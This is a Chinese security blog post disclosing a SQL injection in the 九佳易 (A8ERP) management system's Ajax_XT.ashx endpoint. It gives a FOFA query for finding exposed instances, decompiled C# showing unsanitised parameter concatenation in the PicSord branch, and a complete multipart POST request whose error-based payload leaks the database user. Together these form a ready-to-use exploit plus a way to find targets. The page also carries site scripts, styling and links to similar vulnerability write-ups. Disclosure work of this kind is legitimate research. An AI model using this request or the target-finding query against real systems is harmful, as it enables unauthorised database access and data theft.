---
title: "九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞"
source: https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html
asset_dir: assets/九佳易管理系统-ajax_xt.ashx-sql-注入漏洞
---

# 九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/28 08:30
* 243浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

应用程序接口

程序接口

客户端


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

九佳易管理系统中的 Ajax\_XT.ashx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

SQL注入检测工具

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

根据 Service/Ajax\_XT.ashx 的代码引用

```
<%@ WebHandler Language="C#" CodeBehind="Ajax_XT.cs" Class="A8ERP.Ajax_XT" %>
```

找到 Ajax\_XT 相关类的实现逻辑

代码安全审计

```
public class Ajax_XT : IHttpHandler, IRequiresSessionState
{
  public void ProcessRequest(HttpContext context)
  {
    context.Response.ContentType = "text/plain";
    string str1 = context.Request["curFlag"].ToString();
    string str2;
    object obj1;
    string str3;
    string str4;
    string str5;
    if ("XT_YJCD_SAVE".Equals(str1)){......}
    ......
    else if ("PicSord".Equals(str1))
{
  DBHelp dbHelp = new DBHelp();
  dbHelp.Open();
  string str30 = context.Request["curSpkh"].ToString().Trim();
  string[] strArray = context.Request["curPxbh"].ToString().Trim().Split(new char[1]
  {
    ','
  });
  StringBuilder stringBuilder = new StringBuilder();
  for (int index = 0; index < strArray.Length; ++index)
    stringBuilder.Append($"update da_sp_pic set pxxh='{(object) (index + 1)}' where spkh='{str30}' and sortid='{strArray[index]}';");
  SqlCommand command = dbHelp.GetCommand(stringBuilder.ToString());
  obj1 = (object) 0;
```

深入探索

安全认证考试

文本剥离工具

文件大小转换

[![九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞](images/img-001-fac151cd7919.webp)](https://image.mrxn.net/2453adbb8f1644cfba4a53f85eb75b9d.webp)

其中绝大部分都是参数绑定的方式进行传参处理，不存在SQL注入漏洞，少部分是直接参数拼接，如当**curFlag=PicSord**时，参数**curSpkh==>str30** 以及 **curPxbh** 被直接拼接进`$"update da_sp_pic set pxxh='{(object) (index + 1)}' where spkh='{str30}' and sortid='{strArray[index]}';"`sql语句中，无任何过滤或校验就直接执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

深入探索

安全研究工具

恶意软件分析工具

漏洞扫描器

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式
>
> 漏洞修复方案

```
POST /Service/Ajax_XT.ashx HTTP/1.1
Host: a8erp.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="curFlag"

PicSord
------WebKitFormBoundary
Content-Disposition: form-data; name="curPxbh"

1,2
------WebKitFormBoundary
Content-Disposition: form-data; name="curSpkh"

'-1/user--
------WebKitFormBoundary--
```

[![九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞](images/img-002-84cee657ca0d.webp)](https://image.mrxn.net/f6acc4b8ed294f7da5333bdf1d97f080.webp)

成功利用报错注入在响应回显当前数据库用户信息

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)  
文章链接：<https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-Ajax\_XT-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

网络

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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